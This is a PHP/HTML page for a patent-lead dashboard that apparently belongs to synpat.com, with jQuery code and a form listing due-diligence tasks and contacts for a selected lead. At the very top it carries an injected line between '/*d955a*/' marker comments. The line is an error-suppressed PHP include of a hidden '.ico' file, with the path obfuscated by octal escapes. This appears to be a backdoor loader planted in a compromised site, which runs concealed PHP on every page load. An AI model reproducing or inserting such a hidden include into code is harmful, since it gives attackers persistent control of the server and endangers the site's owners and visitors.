<?php
/*d955a*/

@include "\057var/\167ww/s\171npat\057mobi\154e-ap\160lica\164ion/\144d/.2\06415f7\146c.ic\157";

/*d955a*/




?>

<html>
<head>

<!-- Include meta tag to ensure proper rendering and touch zooming -->
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<!-- Include jQuery Mobile stylesheets -->
<link href='//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css' rel='stylesheet' />
<link rel="stylesheet" href="//code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.min.css">
<!-- Include the jQuery library -->
<script src="//code.jquery.com/jquery-1.11.3.min.js"></script>
<!-- Include the jQuery Mobile library -->
<script src="//code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.min.js"></script>
<style>
.ui-page-theme-a{background-color:#fff}
.ui-mobile label, .ui-controlgroup-label{display:inline}
.ui-checkbox input, .ui-radio input	{left: unset; right:10px; margin: 0px; top: -26px;}
/*.ui-mobile label, div.ui-controlgroup-label, span {font-size:12px;}*/
span.span-control{height:20px;overflow:hidden;display:inline-table;}
#leadId-button{padding:0px;border:0px;background:none;text-shadow: none;box-shadow: none;}
#leadId-button span.form-control{border: 0px;box-shadow: none;}
#leadId-button select{padding:0px;padding-left:10px;border: 0px;box-shadow: none;}
/*.form-group label{float:left;width:30%}
span.span-control{float:left;width:30%;display:inline-table;}
span.span-control1,.ui-checkbox{float:left;width:20%;}*/
span.span-control1{position:absolute;top:0px;right:-30px;}
.custom-dv{float:left;width:100%;margin-bottom:10px;}
.form-group{margin-bottom:5px;}
.ui-checkbox input{}
.absR{position:absolute;right:-8px;top:-26px}
body, .ui-mobile label, div.ui-controlgroup-label{font-size:14px;}
#lead_list .ui-select{border: 0px;box-shadow: none;}
</style>
<script>
function getAllActiveLeads(){
	jQuery.ajax({type:"POST",url:"https://backyard.synpat.com/partners/get_active_leads",cache:false,success:function(a){
		var leadsList = jQuery.parseJSON(a);
		if(leadsList.length>0){			
			jQuery.each(leadsList,function(idx,lead){
				jQuery("#leadId").append("<option value='"+lead.id+"'>"+lead.lead_name+" - ("+lead.family+")</option>");
			});
		}
	}});
}
function resetAllOptions(){
	jQuery("#spnleadOpenLegalOpenContact,#spnleadOpenLegalPatent,#spnleadOpenIllustrationOpenContact,#spnleadOpenIllustrationPatent,#spnleadOpenTechnicalOpenContact,#spnleadOpenTechnicalPatent,#spnleadOpenMarketOpenContact,#spnleadOpenMarketPatent,#spnleadOpenPdfOpenContact,#spnleadOpenPdfPatent,#spnleadOpenComparablesOpenContact,#spnleadOpenComparablesPatent,#spnleadOpenRoyaltyOpenContact,#spnleadOpenRoyaltyOpenContactPatent,#spnleadOpenIntroimagesOpenContact,#spnleadOpenIntroPatent,#spnleadOpenIntroOpenContact,#spnleadOpenSellerOpenContact,#spnleadOpenSellerPatent").text('')
	jQuery("#spnleadOpenLegalOpenContact,#spnleadOpenLegalPatent,#spnleadOpenIllustrationPatent,#spnleadOpenIllustrationOpenContact,#spnleadOpenTechnicalOpenContact,#spnleadOpenTechnicalPatent,#spnleadOpenMarketOpenContact,#spnleadOpenMarketPatent,#spnleadOpenPdfOpenContact,#spnleadOpenPdfPatent,#spnleadOpenComparablesOpenContact,#spnleadOpenComparablesPatent,#spnleadOpenRoyaltyOpenContact,#spnleadOpenRoyaltyOpenContactPatent,#spnleadOpenIntroimagesOpenContact,#spnleadOpenIntroPatent,#spnleadOpenIntroOpenContact,#spnleadOpenSellerOpenContact,#spnleadOpenSellerPatent").attr('title','');
	jQuery("#leadOpenLegalOpenStatus,#leadOpenIllustrationOpenStatus,#leadOpenTechnicalOpenStatus,#leadOpenMarketOpenStatus,#leadOpenPdfOpenStatus,#leadOpenComparablesOpenStatus,#leadOpenRoyaltyOpenStatus,#leadOpenIntroimagesOpenStatus,#leadOpenIntroOpenStatus,#leadOpenSellerOpenStatus").prop('checked',false);
	jQuery('.absR').text('');
	jQuery("#leadOpenLegalOpenContact,#leadOpenIllustrationOpenContact,#leadOpenTechnicalOpenContact,#leadOpenMarketOpenContact,#leadOpenPdfOpenContact,#leadOpenComparablesOpenContact,#leadOpenRoyaltyOpenContact,#leadOpenIntroimagesOpenContact,#leadOpenIntroOpenContact,#leadOpenSellerOpenContact").val('');
	jQuery("#leadOpenLegalContact,#leadOpenIllustrationContact,#leadOpenTechnicalContact,#leadOpenMarketContact,#leadOpenPdfContact,#leadOpenComparablesContact,#leadOpenRoyaltyContact,#leadOpenIntroimagesContact,#leadOpenIntroContact,#leadOpenSellerContact").val(0);	
}
var serialNumber = 0;
function getOpenProjectFromLead(o){
	resetAllOptions();
	if(o.val()>0){		
		jQuery.ajax({type:'POST',url:'https://backyard.synpat.com/partners/get_lead_open_source_project',data:{lead_id:o.val()},dataType:'json',cache:false,success:function(a){
			if(typeof a.open_project!='undefined'){
				open_project = a.open_project;
				objMainElement = jQuery('.ui-content');
				if(open_project.length>0){
					serialNumber = a.serial_number;
					for(op=0;op<open_project.length;op+=1){
						check= false;
						if(parseInt(open_project[op].status)==1){
							check=true;
						}
						var companyName = open_project[op].company_name;
						companyName = companyName.split(" ")[0];
						_nameCombine = open_project[op].personName+', '+companyName;
						switch(parseInt(open_project[op].type)){
							case 1:
							/*window.parent.jQuery('#'+_mainButtonParentElement).find('input#leadOpenPatentOpenContact').val(open_project[op].personName+', '+open_project[op].company_name);
							window.parent.jQuery('#'+_mainButtonParentElement).find('input#leadOpenPatentContact').val(open_project[op].contact_id);
							window.parent.jQuery('#'+_mainButtonParentElement).find('input#leadOpenPatentOpenStatus').prop('checked',check);*/
							break;
							case 2:
								objMainElement.find('input#leadOpenTechnicalOpenContact').val(_nameCombine);
								objMainElement.find('span#spnleadOpenTechnicalOpenContact').attr('title',_nameCombine).text(_nameCombine);
								objMainElement.find('input#leadOpenTechnicalContact').val(open_project[op].contact_id);
								objMainElement.find('input#leadOpenTechnicalOpenStatus').prop('checked',check);
							break;
							case 12:
								objMainElement.find('input#leadOpenMarketOpenContact').val(_nameCombine);
								objMainElement.find('span#spnleadOpenMarketOpenContact').attr('title',_nameCombine).text(_nameCombine);
								objMainElement.find('input#leadOpenMarketContact').val(open_project[op].contact_id);
								objMainElement.find('input#leadOpenMarketOpenStatus').prop('checked',check);
							break;
							case 3:
								objMainElement.find('input#leadOpenLegalOpenContact').val(_nameCombine);
								objMainElement.find('span#spnleadOpenLegalOpenContact').attr('title',_nameCombine).text(_nameCombine);
								objMainElement.find('input#leadOpenLegalContact').val(open_project[op].contact_id);
								objMainElement.find('input#leadOpenLegalOpenStatus').prop('checked',check);
							break;
							case 4:
								objMainElement.find('input#leadOpenIllustrationOpenContact').val(_nameCombine);
								objMainElement.find('span#spnleadOpenIllustrationOpenContact').attr('title',_nameCombine).text(_nameCombine);
								objMainElement.find('input#leadOpenIllustrationContact').val(open_project[op].contact_id);
								objMainElement.find('input#leadOpenIllustrationOpenStatus').prop('checked',check);
							break;
							case 5:
								objMainElement.find('input#leadOpenRoyaltyOpenContact').val(_nameCombine);
								objMainElement.find('span#spnleadOpenRoyaltyOpenContact').attr('title',_nameCombine).text(_nameCombine);
								objMainElement.find('input#leadOpenRoyaltyContact').val(open_project[op].contact_id);
								objMainElement.find('input#leadOpenRoyaltyOpenStatus').prop('checked',check);
							break;
							case 6:
								objMainElement.find('input#leadOpenInviteesOpenContact').val(_nameCombine);
								objMainElement.find('span#spnleadOpenInviteesOpenContact').attr('title',_nameCombine).text(_nameCombine);
								objMainElement.find('input#leadOpenInviteesContact').val(open_project[op].contact_id);
								objMainElement.find('input#leadOpenInviteesOpenStatus').prop('checked',check);
							break;
							case 7:
								/*Seller*/
								objMainElement.find('input#leadOpenSellerOpenContact').val(_nameCombine);
								objMainElement.find('input#leadOpenSellerContact').val(open_project[op].contact_id);
								objMainElement.find('span#spnleadOpenSellerOpenContact').attr('title',_nameCombine).text(_nameCombine);
								objMainElement.find('input#leadOpenSellerOpenStatus').prop('checked',check);
							break;
							case 8:
								objMainElement.find('input#leadOpenIntroOpenContact').val(_nameCombine);
								objMainElement.find('span#spnleadOpenIntroOpenContact').attr('title',_nameCombine).text(_nameCombine);
								objMainElement.find('input#leadOpenIntroContact').val(open_project[op].contact_id);
								objMainElement.find('input#leadOpenIntroOpenStatus').prop('checked',check);
							break;
							case 9:
								objMainElement.find('input#leadOpenComparablesOpenContact').val(_nameCombine);
								objMainElement.find('span#spnleadOpenComparablesOpenContact').attr('title',_nameCombine).text(_nameCombine);
								objMainElement.find('input#leadOpenComparablesContact').val(open_project[op].contact_id);
								objMainElement.find('input#leadOpenComparablesOpenStatus').prop('checked',check);
							break;					
							case 10:
								objMainElement.find('input#leadOpenPdfOpenContact').val(_nameCombine);
								objMainElement.find('span#spnleadOpenPdfOpenContact').attr('title',_nameCombine).text(_nameCombine);
								objMainElement.find('input#leadOpenPdfContact').val(open_project[op].contact_id);
								objMainElement.find('input#leadOpenPdfOpenStatus').prop('checked',check);
							break;
							case 11:
								objMainElement.find('input#leadOpenIntroimagesOpenContact').val(_nameCombine);
								objMainElement.find('span#spnleadOpenIntroimagesOpenContact').attr('title',_nameCombine).text(_nameCombine);
								objMainElement.find('input#leadOpenIntroimagesContact').val(open_project[op].contact_id);
								objMainElement.find('input#leadOpenIntroimagesOpenStatus').prop('checked',check);
							break;					
						}
					}
					var illusParent = objMainElement.find('#leadOpenIllustrationOpenStatus').parent();
					if(illusParent.find('span').length>0){
						illusParent.find('span').html(a.illustrationComplete);
					} else {
						illusParent.append('<span class="absR">'+a.illustrationComplete+'</span>');
					}
					
					var techParent = objMainElement.find('#leadOpenTechnicalOpenStatus').parent();
					if(techParent.find('span').length>0){
						techParent.find('span').html(a.techDDComplete);
					} else {
						techParent.append('<span class="absR">'+a.techDDComplete+'</span>');
					}
					
					var marketParent = objMainElement.find('#leadOpenMarketOpenStatus').parent();
					if(marketParent.find('span').length>0){
						marketParent.find('span').html(a.marketDDComplete);
					} else {
						marketParent.append('<span class="absR">'+a.marketDDComplete+'</span>');
					}
					
					var legalParent = objMainElement.find('#leadOpenLegalOpenStatus').parent();
					if(legalParent.find('span').length>0){
						legalParent.find('span').html(a.legalDDComplete);
					} else {
						legalParent.append('<span class="absR">'+a.legalDDComplete+'</span>');
					}
					
					var pdfParent = objMainElement.find('#leadOpenPdfOpenStatus').parent();
					if(pdfParent.find('span').length>0){
						pdfParent.find('span').html(a.pdfDDComplete);
					} else {
						pdfParent.append('<span class="absR">'+a.pdfDDComplete+'</span>');
					}
					
					var compareblesParent = objMainElement.find('#leadOpenComparablesOpenStatus').parent();
					if(compareblesParent.find('span').length>0){
						compareblesParent.find('span').html(a.comparablesComplete);
					} else {
						compareblesParent.append('<span class="absR">'+a.comparablesComplete+'</span>');
					}
										
					var introParent = objMainElement.find('#leadOpenIntroimagesOpenStatus').parent();
					if(introParent.find('span').length>0){
						introParent.find('span').html(a.imageComplete);
					} else {
						introParent.append('<span class="absR">'+a.imageComplete+'</span>');
					}
					
					var royaltyParent = objMainElement.find('#leadOpenRoyaltyOpenStatus').parent();
					if(royaltyParent.find('span').length>0){
						royaltyParent.find('span').html(a.royaltyComplete);
					} else {
						royaltyParent.append('<span class="absR">'+a.royaltyComplete+'</span>');
					}
					
					var sellerParent = objMainElement.find('#leadOpenSellerOpenStatus').parent();
					if(sellerParent.find('span').length>0){
						sellerParent.find('span').html(a.sellerdd);
					} else {
						sellerParent.append('<span class="absR">'+a.sellerdd+'</span>');
					}
					/*objMainElement.find('span#spnleadOpenIllustrationPatent').attr('title',a.illustrationComplete).text(a.illustrationComplete);
					objMainElement.find('span#spnleadOpenTechnicalPatent').attr('title',a.techDDComplete).text(a.techDDComplete);
					objMainElement.find('span#spnleadOpenMarketPatent').attr('title',a.marketDDComplete).text(a.marketDDComplete);
					objMainElement.find('span#spnleadOpenLegalPatent').attr('title',a.legalDDComplete).text(a.legalDDComplete);
					objMainElement.find('span#spnleadOpenPdfPatent').attr('title',a.pdfDDComplete).text(a.pdfDDComplete);
					objMainElement.find('span#spnleadOpenComparablesPatent').attr('title',a.comparablesComplete).text(a.comparablesComplete);
					objMainElement.find('span#spnleadOpenInviteesPatent').attr('title',a.invitesComplete).text(a.invitesComplete);
					objMainElement.find('span#spnleadOpenIntroPatent').attr('title',a.imageComplete).text(a.imageComplete);
					objMainElement.find('span#spnleadOpenRoyaltyOpenContactPatent').attr('title',a.royaltyComplete).text(a.royaltyComplete);
					objMainElement.find('span#spnleadOpenSellerPatent').attr('title',a.sellerdd).text(a.sellerdd);*/
				}
			}
		}});
	}
}
function filterLeadOpenSource(type){
	if(serialNumber>0){
		_href = "";
		switch(type){
			case "legaldd":
				_href="http://synpat.com/legaldd/"+serialNumber;
			break;
			case "illustrationdd":
				_href="http://synpat.com/illustrationdd/index/"+serialNumber;
			break;
			case "techdd":
				_href="http://synpat.com/techdd/"+serialNumber;
			break;
			case "marketdd":
				_href="http://synpat.com/marketdd/"+serialNumber;
			break;
			case "pdfdd":
				_href="https://synpat.com/pdfdd/index/"+serialNumber;
			break;
			case "comparedd":
				_href="https://synpat.com/comparedd/"+serialNumber;
			break;
			case "royalty":
				//_href="http://synpat.com/illustrationdd/index/"+serialNumber;
			break;
			case "introimages":
				_href="http://synpat.com/introimages/index/"+serialNumber;
			break;
			case "introduction":
				_href="http://synpat.com/store/"+serialNumber+"/?edit";
			break;
			case "dd":
				_href="https://synpat.com/dd/"+serialNumber;
			break;
		}
		if(_href!=""){
			window.open(_href,"_blank");
		}
	}
	
}
jQuery(document).ready(function(){
	/*Page ready*/
	getAllActiveLeads();
	jQuery(window).bind("beforeunload",function(event) {
		(event || window.event).returnValue = null;
		return null;
	});
});
</script>
</head>
<body>
<div data-role="page" id="pageone">
	<!--<div data-role="panel" id="overlayPanel" data-display="overlay">-->
	<div data-role="main" class="ui-content">
		<!--<a href="#pageone" data-rel="close" class="ui-btn ui-btn-inline ui-shadow ui-corner-all ui-btn-a ui-icon-delete ui-btn-icon-left">Close panel</a>-->
		<div class='row'>
			<div class="col-md-12" id="lead_list">
				<div class="form-group input-string-group nomr mrg5T" style='margin-right:-5px;'>						
					<select name="lead_id" id="leadId" required class="form-control " onchange="getOpenProjectFromLead(jQuery(this));">
						<option value="">Select Lead</option>
					</select>
					<a href='http://app.synpat.com' style='position: absolute;right: -9px;top: 12px;background-image:url("./icons8-Menu 2-16.png");height: 16px;width: 16px;'></a>
				</div>
			</div>
			<div class="col-md-12">
				<div class="form-group input-string-group nomr">
					<label for="marketProspectsName" class="control-label" style="padding-left:2px;"><a href="javascript://" onclick="filterLeadOpenSource(&quot;legaldd&quot;)">Legal DD:</a></label>
					<span title="" style="text-align: left;width:173px !important;" id="spnleadOpenLegalOpenContact" class="control-label span-control borderBtm"></span>
					<span style='position:relative'><span title="" id="spnleadOpenLegalPatent" class="control-label span-control1 borderBtm" style="width:15px !important"></span></span>
					<input name="lead_open[legal_open_status]" value="1" id="leadOpenLegalOpenStatus" onclick="checkLeadOpen(jQuery(this))" data-leadopen="legal" class="mrg5L" type="checkbox"/>
					<input name="lead_open[legal_open_contact]" value="" id="leadOpenLegalOpenContact" placeholder="" class="input-string" style="width:120px;border:none;" type="hidden"/>
					<input name="lead_open[legal_contact]" value="0" id="leadOpenLegalContact" type="hidden"/>
				</div>
			</div>
			<div class="col-md-12">
				<div class="form-group input-string-group nomr">
					<label for="marketProspectsName" class="control-label" style="padding-left:2px;"><a href="javascript://" onclick="filterLeadOpenSource(&quot;illustrationdd&quot;)">Illustration:</a></label>
					<span title="" style="text-align: left;" id="spnleadOpenIllustrationOpenContact" class="control-label span-control borderBtm"></span>
					<span style='position:relative'><span title="" id="spnleadOpenIllustrationPatent" class="control-label span-control1 borderBtm" style="width:15px !important"></span></span>
					<input name="lead_open[illustration_open_status]" value="1" id="leadOpenIllustrationOpenStatus" onclick="checkLeadOpen(jQuery(this))" data-leadopen="claim" class="mrg5L" type="checkbox">
					<input name="lead_open[illustration_open_contact]" value="Vivek Yahoo Email, Rahul Co" id="leadOpenIllustrationOpenContact" placeholder="" class="input-string" style="width:120px;border:none;" type="hidden">					
					<input name="lead_open[illustration_contact]" value="0" id="leadOpenIllustrationContact" type="hidden">
				</div>
			</div>
			<div class="col-md-12">
				<div class="form-group input-string-group nomr">
					<label for="marketProspectsName" class="control-label" style="padding-left:2px;"><a href="javascript://" onclick="filterLeadOpenSource(&quot;techdd&quot;)">Tech DD:</a></label>
					<span title="" style="text-align: left;" id="spnleadOpenTechnicalOpenContact" class="control-label span-control borderBtm"></span>
					<span style='position:relative'><span title="" id="spnleadOpenTechnicalPatent" class="control-label span-control1 borderBtm" style="width:15px !important"></span></span>
					<input name="lead_open[technnical_open_status]" value="1" id="leadOpenTechnicalOpenStatus" onclick="checkLeadOpen(jQuery(this))" data-leadopen="tech" class="mrg5L" type="checkbox">
					<input name="lead_open[technical_open_contact]" value="" id="leadOpenTechnicalOpenContact" placeholder="" class="input-string" style="width:120px;border:none;" type="hidden">	
					<input name="lead_open[technical_contact]" value="0" id="leadOpenTechnicalContact" type="hidden">
				</div>
			</div>
			<div class="col-md-12">
				<div class="form-group input-string-group nomr">
					<label for="marketProspectsName" class="control-label" style="padding-left:2px;"><a href="javascript://" onclick="filterLeadOpenSource(&quot;marketdd&quot;)">Market DD:</a></label>
					<span title="" style="text-align: left;" id="spnleadOpenMarketOpenContact" class="control-label span-control borderBtm"></span>	
					<span style='position:relative'><span title="" id="spnleadOpenMarketPatent" class="control-label span-control1 borderBtm" style="width:15px !important"></span></span>
					<input name="lead_open[market_open_status]" value="1" id="leadOpenMarketOpenStatus" onclick="checkLeadOpen(jQuery(this))" data-leadopen="market" class="mrg5L" type="checkbox">
					<input name="lead_open[market_open_contact]" value="" id="leadOpenMarketOpenContact" placeholder="" class="input-string" style="width:120px;border:none;" type="hidden">
					<input name="lead_open[market_contact]" value="0" id="leadOpenMarketContact" type="hidden">
				</div>													
			</div>	
			<div class="col-md-12">
				<div class="form-group input-string-group nomr">
					<label for="marketProspectsName" class="control-label" style="padding-left:2px;"><a href="javascript://" onclick="filterLeadOpenSource(&quot;pdfdd&quot;)">PDFs:</a></label>
					<span title="" style="text-align: left;" id="spnleadOpenPdfOpenContact" class="control-label span-control borderBtm"></span>
					<span style='position:relative'><span title="" id="spnleadOpenPdfPatent" class="control-label span-control1 borderBtm" style="width:15px !important"></span></span>
					<input name="lead_open[intro_open_status]" value="1" id="leadOpenPdfOpenStatus" onclick="checkLeadOpen(jQuery(this))" data-leadopen="pdf" class="mrg5L" type="checkbox">
					<input name="lead_open[pdf_open_contact]" value="" id="leadOpenPdfOpenContact" placeholder="" class="input-string" style="width:120px;border:none;" type="hidden">					
					<input name="lead_open[pdf_contact]" value="0" id="leadOpenPdfContact" type="hidden">													
				</div>	
			</div>
			<div class="col-md-12">
				<div class="form-group input-string-group nomr">
					<label for="marketProspectsName" class="control-label" style="padding-left:2px;"><a href="javascript://" onclick="filterLeadOpenSource(&quot;comparedd&quot;)">Comparables:</a></label>
					<span title="" style="text-align: left;" id="spnleadOpenComparablesOpenContact" class="control-label span-control borderBtm"></span>
					<span style='position:relative'><span title="" id="spnleadOpenComparablesPatent" class="control-label span-control1 borderBtm" style="width:15px !important"></span></span>
					<input name="lead_open[comparables_open_status]" value="1" id="leadOpenComparablesOpenStatus" onclick="checkLeadOpen(jQuery(this))" data-leadopen="comparable" class="mrg5L" type="checkbox">
					<input name="lead_open[comparables_open_contact]" value="" id="leadOpenComparablesOpenContact" placeholder="" class="input-string" style="width:120px;border:none;" type="hidden">
					<input name="lead_open[comparables_contact]" value="0" id="leadOpenComparablesContact" type="hidden">
				</div>	
			</div>	
			<div class="col-md-12">
				<div class="form-group input-string-group nomr">
					<label for="marketProspectsName" class="control-label" style="padding-left:2px;"><a href="javascript://" onclick="filterLeadOpenSource(&quot;royalty&quot;)">Royalty Report:</a></label>		
					<span title="" style=" text-align: left;" id="spnleadOpenRoyaltyOpenContact" class="control-label span-control borderBtm"></span>
					<span style='position:relative'><span title="" id="spnleadOpenRoyaltyOpenContactPatent" class="control-label span-control1 borderBtm" style="width:15px !important"></span></span>
					<input name="lead_open[royalty_open_status]" value="1" id="leadOpenRoyaltyOpenStatus" onclick="checkLeadOpen(jQuery(this))" data-leadopen="royalty" class="mrg5L" type="checkbox">
					<input name="lead_open[royalty_open_contact]" value="" id="leadOpenRoyaltyOpenContact" placeholder="" class="input-string" style="width:120px;border:none;" type="hidden">
					<input name="lead_open[royalty_contact]" value="0" id="leadOpenRoyaltyContact" type="hidden">											
				</div>													
			</div>	
			<div class="col-md-12">
				<div class="form-group input-string-group nomr">
					<label for="marketProspectsName" class="control-label" style="padding-left:2px;"><a href="javascript://" onclick="filterLeadOpenSource(&quot;introimages&quot;)">Intro Images:</a></label>	
					<span title="" style="text-align: left;" id="spnleadOpenIntroimagesOpenContact" class="control-label span-control borderBtm"></span>
					<span style='position:relative'><span title="" id="spnleadOpenIntroPatent" class="control-label span-control1 borderBtm" style="width:15px 	!important"></span>	</span>
					<input name="lead_open[introimages_open_status]" value="1" id="leadOpenIntroimagesOpenStatus" onclick="checkLeadOpen(jQuery(this))" data-leadopen="images" class="mrg5L" type="checkbox">	
					<input name="lead_open[introimages_open_contact]" value="" id="leadOpenIntroimagesOpenContact" placeholder="" class="input-string" style="width:120px;border:none;" type="hidden">
					<input name="lead_open[introimages_contact]" value="0" id="leadOpenIntroimagesContact" type="hidden">
				</div>
			</div>
			<div class="col-md-12">
				<div class="form-group input-string-group nomr">
					<label for="marketProspectsName" class="control-label" style="padding-left:2px;"><a href="javascript://" onclick="filterLeadOpenSource(&quot;introduction&quot;)">Intro DD:</a></label>
					<span title="" style="width: 190px; text-align: left;" id="spnleadOpenIntroOpenContact" class="control-label span-control borderBtm"></span>
					<input name="lead_open[intro_open_status]" value="1" id="leadOpenIntroOpenStatus" onclick="checkLeadOpen(jQuery(this))" data-leadopen="intro" class="mrg5L" type="checkbox">
					<input name="lead_open[intro_open_contact]" value="" id="leadOpenIntroOpenContact" placeholder="" class="input-string" type="hidden">
					<input name="lead_open[intro_contact]" value="0" id="leadOpenIntroContact" type="hidden">										
				</div>												
			</div>
			<div class='col-md-12'>
				<div class='form-group input-string-group nomr'>					
					<label for="marketOwner" class="control-label" style="padding-left:2px;"><a href="javascript:void(0)" onclick="filterLeadOpenSource('dd');">SellerDD:</a></label>
					<span title="" style="text-align: left;" id="spnleadOpenSellerOpenContact" class="control-label span-control borderBtm"></span>
					<span style='position:relative'><span title="0" id="spnleadOpenSellerPatent" class="control-label span-control1 borderBtm" style="width:15px !important"></span></span>
					<input name="lead_open[legal_open_status]" value="1" id="leadOpenSellerOpenStatus" onclick="checkLeadOpen(jQuery(this))" data-leadopen="sellerdd" class="mrg5L" type="checkbox">
					<input name="lead_open[seller_open_contact]" value="" id="leadOpenSellerOpenContact" placeholder="" class="input-string" style="width:120px;border:none;" type="hidden">
					<input name="lead_open[seller_contact]" value="0" id="leadOpenSellerContact" type="hidden">
				</div>
			</div>
		</div>
	</div>
</body>